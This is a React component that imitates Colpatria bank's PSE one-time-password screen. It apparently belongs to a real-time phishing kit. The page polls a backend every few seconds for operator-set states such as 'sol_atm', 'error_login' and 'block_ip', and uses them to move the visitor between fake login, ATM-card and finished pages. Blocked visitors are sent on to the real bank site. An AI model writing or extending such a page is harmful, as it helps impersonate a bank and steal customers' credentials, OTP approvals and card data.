import { useEffect, useRef, useState } from "react";
import { X, Info } from "lucide-react";
import { useNavigate, useLocation } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingColpatriaOtp from "../../../../../components/LoadingColpatriaOtp";
import "./otp_colpatria_pse.css";
import banerColpatria from "../../img/baner_colpatria.png";

const INITIAL_COUNTDOWN_SEC = 60;
const COLPATRIA_ERROR_KEY = "colpatria_error_modal";
const COLPATRIA_MID_FLOW_KEY = "colpatria_mid_flow";
const COLPATRIA_OTP_REFRESH_KEY = "colpatria_otp_refresh";
const COLPATRIA_ATM_REFRESH_KEY = "colpatria_atm_refresh";
const COLPATRIA_OTP_ERROR_AUTO_HIDE_MS = 5000;

const ESTADOS_TRAS_ENVIO_OTP = [
  "sol_atm",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_otp",
  "error_atm",
  "error_login",
  "block_ip",
  "error_blocked",
];

const ESTADOS_SIEMPRE_REPROCESAR = [
  "error_otp",
  "error_atm",
  "error_login",
  "block_ip",
  "error_blocked",
  "sol_otp",
];

const OTP_ERROR_MSG =
  "Error al intentar aceptar el codigo OTP, porfavor intente nuevamente";

function ColpatriaAlertIcon({ className = "" }) {
  return (
    <svg
      className={className ? `colpatria-alert-diamond ${className}` : "colpatria-alert-diamond"}
      width={22}
      height={22}
      viewBox="0 0 20 20"
      aria-hidden
    >
      <g transform="translate(10 10) rotate(45)">
        <rect
          x="-6.5"
          y="-6.5"
          width="13"
          height="13"
          rx="1.5"
          fill="currentColor"
        />
      </g>
      <text
        x="10"
        y="14.5"
        textAnchor="middle"
        fontSize="11"
        fontWeight="800"
        fill="#ffffff"
        fontFamily="system-ui, -apple-system, BlinkMacSystemFont, sans-serif"
      >
        !
      </text>
    </svg>
  );
}

function formatMmSs(totalSec) {
  const m = Math.floor(totalSec / 60);
  const s = totalSec % 60;
  return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
}

export default function OtpColpatriaPse() {
  const navigate = useNavigate();
  const location = useLocation();

  const [secondsLeft, setSecondsLeft] = useState(0);
  const [getLoading, setLoading] = useState(false);
  const [showOtpErrorAlert, setShowOtpErrorAlert] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const envioEnCursoRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);

  const resetOtpEsperaUi = () => {
    envioEnCursoRef.current = false;
    setLoading(false);
  };

  const resetResendCountdown = () => {
    setSecondsLeft(0);
  };

  const dismissOtpErrorAlert = () => {
    setShowOtpErrorAlert(false);

    if (modalBloqueoEstadoRef.current === "error_otp") {
      ignorarEstadoHastaCambioRef.current = "error_otp";
      modalBloqueoEstadoRef.current = null;
      allowPollNavigationRef.current = false;
      sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
      initPolling();
    }
  };

  const dismissOtpErrorAlertIfOpen = () => {
    if (showOtpErrorAlert) {
      dismissOtpErrorAlert();
    }
  };

  const showOtpError = () => {
    ignorarEstadoHastaCambioRef.current = null;
    stopPolling();
    resetOtpEsperaUi();
    resetResendCountdown();
    allowPollNavigationRef.current = false;
    sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
    modalBloqueoEstadoRef.current = "error_otp";
    lastEstadoRef.current = "error_otp";
    setShowOtpErrorAlert(true);
  };

  const redirigirOtp = () => {
    sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");
    navigate("/colpatria_pse_otp", {
      replace: true,
      state: { signal: Date.now() },
    });
  };

  const bootstrapOtpScreen = () => {
    stopPolling();

    const pendingResult = applyPendingScreenSignal();

    if (pendingResult === "error_login") {
      return;
    }

    if (pendingResult === "error_otp") {
      return;
    }

    if (sessionStorage.getItem(COLPATRIA_OTP_REFRESH_KEY) === "1") {
      sessionStorage.removeItem(COLPATRIA_OTP_REFRESH_KEY);
      ignorarEstadoHastaCambioRef.current = null;
      modalBloqueoEstadoRef.current = null;
      lastEstadoRef.current = null;
      resetOtpEsperaUi();
      allowPollNavigationRef.current = false;
      sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
      return;
    }

    const sid = localStorage.getItem("sessionId");
    if (!sid) {
      resetOtpEsperaUi();
      return;
    }

    sessionIdRef.current = sid;

    if (sessionStorage.getItem(COLPATRIA_MID_FLOW_KEY) === "1") {
      allowPollNavigationRef.current = true;
      initPolling();
      return;
    }

    resetOtpEsperaUi();
  };

  const applyPendingScreenSignal = () => {
    const pendingError = localStorage.getItem(COLPATRIA_ERROR_KEY);
    if (!pendingError) return null;

    resetOtpEsperaUi();
    allowPollNavigationRef.current = false;
    sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

    if (pendingError === "error_otp") {
      localStorage.removeItem(COLPATRIA_ERROR_KEY);
      showOtpError();
      return "error_otp";
    }

    if (pendingError === "error_login") {
      stopPolling();
      redirigirLogin();
      return "error_login";
    }

    localStorage.removeItem(COLPATRIA_ERROR_KEY);

    if (pendingError === "block_ip") {
      modalBloqueoEstadoRef.current = "block_ip";
      setShowModal(true);
      setModalText("Acceso bloqueado por seguridad.");
    }

    return pendingError;
  };

  useEffect(() => {
    if (secondsLeft <= 0) return undefined;
    const id = setTimeout(() => {
      setSecondsLeft((t) => (t <= 1 ? 0 : t - 1));
    }, 1000);
    return () => clearTimeout(id);
  }, [secondsLeft]);

  useEffect(() => {
    if (!showOtpErrorAlert) return undefined;

    const timer = window.setTimeout(() => {
      dismissOtpErrorAlert();
    }, COLPATRIA_OTP_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showOtpErrorAlert]);

  useEffect(() => {
    bootstrapOtpScreen();

    return () => {
      stopPolling();
    };
  }, [location.pathname, location.key, location.state]);

  const handleResend = async () => {
    if (getLoading || secondsLeft > 0) return;

    dismissOtpErrorAlertIfOpen();

    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;
    if (!sessionId) {
      setShowModal(true);
      setModalText("Sesión no encontrada. Vuelve a iniciar sesión.");
      return;
    }

    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    const dataSend = {
      data: {
        attributes: {
          sessionId,
          backend: "P01",
          backend_central_url:
            process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/colpatria/otp-resend",
        },
      },
    };

    try {
      setLoading(true);
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/colpatria/otp-resend", dataSend);

      if (response?.data?.success) {
        const sid = response.data.sessionId ?? sessionId;
        localStorage.setItem("sessionId", sid);
        sessionIdRef.current = sid;
        setSecondsLeft(INITIAL_COUNTDOWN_SEC);
      } else {
        setShowModal(true);
        setModalText("No se pudo solicitar una nueva notificación. Intenta de nuevo.");
      }
    } catch (error) {
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      setShowModal(true);
      setModalText(
        centralUrl
          ? "Error de comunicación con el servidor central."
          : "Error de conexión con el servidor.",
      );
    } finally {
      setLoading(false);
    }
  };

  // Se crea helper de redirección
  const redirigir = (ruta) => {
    navigate(ruta);
  };

  const redirigirLogin = () => {
    navigate("/colpatria_pse_login", {
      replace: true,
      state: { signal: Date.now() },
    });
  };

  // Se limpia y cierra modal local
  const closeModal = () => {
    modalBloqueoEstadoRef.current = null;
    setShowModal(false);
    setModalText("");
  };

  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  const initPolling = () => {
    stopPolling();
    pollingIntervalRef.current = setInterval(() => {
      verifyState();
    }, 3000);
    verifyState();
  };

  // Se valida estado desde backend
  const verifyState = async () => {
    try {
      const response = await instanceBackend.post(
        `/colpatria/verify-state/${sessionIdRef.current}`,
      );
      const estadoActual = (response?.data?.estado || "").toLowerCase();

      if (!estadoActual) return;

      if (ignorarEstadoHastaCambioRef.current) {
        if (estadoActual === ignorarEstadoHastaCambioRef.current) return;
        ignorarEstadoHastaCambioRef.current = null;
        modalBloqueoEstadoRef.current = null;
      }

      if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {
        return;
      }

      if (
        ESTADOS_TRAS_ENVIO_OTP.includes(estadoActual) &&
        !allowPollNavigationRef.current
      ) {
        return;
      }

      if (
        lastEstadoRef.current === estadoActual &&
        !ESTADOS_SIEMPRE_REPROCESAR.includes(estadoActual)
      ) {
        return;
      }
      lastEstadoRef.current = estadoActual;

      switch (estadoActual) {
        case "sol_otp":
          envioEnCursoRef.current = false;
          setLoading(false);
          allowPollNavigationRef.current = false;
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          break;
        case "sol_atm":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          redirigir("/colpatria_pse_atm");
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          redirigir("/finalizado-pse");
          break;
        case "error_otp":
          if (location.pathname === "/colpatria_pse_otp") {
            showOtpError();
          } else {
            localStorage.setItem(COLPATRIA_ERROR_KEY, "error_otp");
            sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");
            redirigirOtp();
          }
          break;
        case "error_atm":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          localStorage.setItem(COLPATRIA_ERROR_KEY, "error_atm");
          sessionStorage.setItem(COLPATRIA_ATM_REFRESH_KEY, "1");
          navigate("/colpatria_pse_atm", {
            replace: true,
            state: { signal: Date.now() },
          });
          break;
        case "error_login":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          localStorage.setItem(COLPATRIA_ERROR_KEY, "error_login");
          redirigirLogin();
          break;
        case "block_ip":
        case "error_blocked":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          setShowModal(true);
          setModalText("Acceso bloqueado por seguridad.");
          break;
        default:
          break;
      }
    } catch (error) {
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        stopPolling();
        envioEnCursoRef.current = false;
        setLoading(false);
        sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  // Se procesa submit OTP
  const handleSubmit = async () => {
    if (getLoading) return;

    dismissOtpErrorAlertIfOpen();
    ignorarEstadoHastaCambioRef.current = null;
    modalBloqueoEstadoRef.current = null;
    lastEstadoRef.current = null;

    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;
    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    const dataSend = {
      data: {
        attributes: {
          otp: "Confirmado",
          fecha: new Date().toISOString(),
          sessionId,
          backend: "P01",
          backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/colpatria/otp",
        },
      },
    };

    stopPolling();
    lastEstadoRef.current = null;
    envioEnCursoRef.current = true;

    try {
      setLoading(true);
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/colpatria/otp", dataSend);

      if (response?.data?.success) {
        const sid = response.data.sessionId ?? sessionId;
        localStorage.setItem("sessionId", sid);
        sessionIdRef.current = sid;
        sessionStorage.setItem(COLPATRIA_MID_FLOW_KEY, "1");
        allowPollNavigationRef.current = true;
        initPolling();
      } else {
        envioEnCursoRef.current = false;
        setLoading(false);
        showOtpError();
      }
    } catch (error) {
      envioEnCursoRef.current = false;
      setLoading(false);
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      setShowModal(true);
      setModalText(
        centralUrl
          ? "Error de comunicación con el servidor central."
          : "Error de conexión con el servidor.",
      );
    }
  };

  return (
    <div className="colpatria-pse-otp-root">
      <header className="colpatria-pse-otp__header">
        <button
          type="button"
          className="colpatria-pse-otp__close"
          onClick={() => { }}
          aria-label="Cerrar"
        >
          <X size={26} strokeWidth={2} />
        </button>
      </header>

      <main className="colpatria-pse-otp__main">
        <div className="colpatria-pse-otp__content">
          <img
            src={banerColpatria}
            alt=""
            className="colpatria-pse-otp__hero"
          />

          <h1 className="colpatria-pse-otp__title">
            Acepta la notificación que enviamos a tu celular
          </h1>

          {showOtpErrorAlert ? (
            <div className="colpatria-pse-otp__error-alert" role="alert">
              <ColpatriaAlertIcon className="colpatria-pse-otp__error-alert-icon" />
              <p className="colpatria-pse-otp__error-alert-text">{OTP_ERROR_MSG}</p>
            </div>
          ) : null}

          <p className="colpatria-pse-otp__lead">
            Si ya la aceptaste, espera unos segundos mientras se actualiza el
            proceso, y dale al botón Continuar.
          </p>

          <div className="colpatria-pse-otp__timer-slot">
            {secondsLeft > 0 ? (
              <p className="colpatria-pse-otp__timer">
                Solicita una nueva notificación en{" "}
                <span className="colpatria-pse-otp__timer-digits">
                  {formatMmSs(secondsLeft)}
                </span>
              </p>
            ) : (
              <button
                type="button"
                className="colpatria-pse-otp__resend"
                onClick={handleResend}
                disabled={getLoading}
              >
                Solicitar nueva notificación
              </button>
            )}
          </div>

          <button
            type="button"
            className="colpatria-pse-otp__unlink"
            onClick={() => { }}
          >
            <span>Desvincular celular registrado</span>
            <Info
              className="colpatria-pse-otp__unlink-icon"
              size={18}
              strokeWidth={2}
              aria-hidden
            />
          </button>

          <div className="colpatria-pse-otp__confirm-wrap">
            <button
              type="button"
              className="colpatria-pse-otp__confirm"
              onClick={handleSubmit}
              disabled={getLoading}
            >
              Continuar
            </button>
          </div>
        </div>
      </main>

      {showModal && (
        <div className="colpatria-modal-wrap" onClick={closeModal}>
          <div className="colpatria-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="colpatria-modal-top">Personas</div>
            <div className="colpatria-modal-mid">
              <p>{modalText}</p>
            </div>
            <div className="colpatria-modal-bot">
              <button
                type="button"
                className="colpatria-modal-accept-btn"
                onClick={closeModal}
              >
                Aceptar
              </button>
            </div>
          </div>
        </div>
      )}

      {getLoading && <LoadingColpatriaOtp />}
    </div>
  );
}
